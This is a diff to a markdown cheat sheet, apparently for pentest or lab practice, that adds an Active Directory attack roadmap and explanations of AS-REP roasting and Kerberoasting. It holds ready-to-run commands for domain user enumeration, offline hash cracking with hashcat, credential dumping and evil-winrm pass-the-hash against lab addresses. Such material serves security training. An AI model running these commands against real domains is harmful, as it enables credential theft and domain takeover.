@@ -1,4 +1,19 @@
 
+## AD Hack steps
+
+#### 1. logged into in the network (foothold)
++ Find & exploit CVE to get shell on attacker machine.
++ Default credential on LDAP enumeration then use spray attack.
++ User enumeration and use [AS_REP (TGT)] attack to get user password.
+#### 2. (Possibly) escalate privileges in the machine.
+#### 3. Dump credentials (mimikatz) and/or obtain Kerberos tickets (TGS).
+#### 4. Repeat steps above until you have administrative privileges in the Domain Controller.
+
+
++ NOTE [ Don't forget use enumeration tool winpeas.exe / linpeas.sh ] 
+
+
+
 
 ##  Get DOMAIN-Name & Device name 
 ```
@@ -19,6 +34,11 @@ $ ldapsearch -H ldap://10.10.1.12 -x -b DC=test,DC=com "(objectClass=person)" | 
 ```
 + Users enumeration using enum4linux
 ```
+# get all users in the domain
+cmd> net user /domain
+cmd> net user <username> /domain
+```
+```
 $ enum4linux -v [DC-ip]
 $ enum4linux -v 10.10.1.12
 ```
@@ -30,6 +50,8 @@ $ enumdomusers
 ## Active Directory Attacks
 
 ### 1. Non-Pre-authentication AS_REP (TGT)
++ AS-REP Roasting is a technique that enables adversaries to steal the password hashes of user accounts that have Kerberos preauthentication disabled, which they can then attempt to crack offline and get user password.
+
 ```
 $ impacket-GetNPUsers  [dc]/ -no-pass -u [usersname.txt]  -dc-ip [IP]  
 $ impacket-GetNPUsers  test.com/ -no-pass -u users.txt  -dc-ip 10.10.1.12
@@ -47,6 +69,9 @@ $ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ### 2. Kerberoasting SPN (TGS)
++ A user is allowed to request a ticket-granting service (TGS) ticket for any SPN, and parts of the TGS may be encrypted with RC4 using the password hash of the service account that is assigned the requested SPN as the key
+
+
  #### A. Enumerate servicePrincipalNames (SPN)
  + using Linux (credentials required)
  ```
@@ -149,7 +174,7 @@ rdesktop -u <user> -p <pass> <pass>
 $ rdesktop -u Allison -p pass123 10.10.1.12
 $ rdesktop -E -d test.com  -u Allison  -p pass123 10.10.1.12   #login use domain user 
 ```
-+ pass the Hash
++ Pass-the-Hash
 ```
 $ evil-winrm -i <ip> -u <user> -p <NTLM hash> 
 
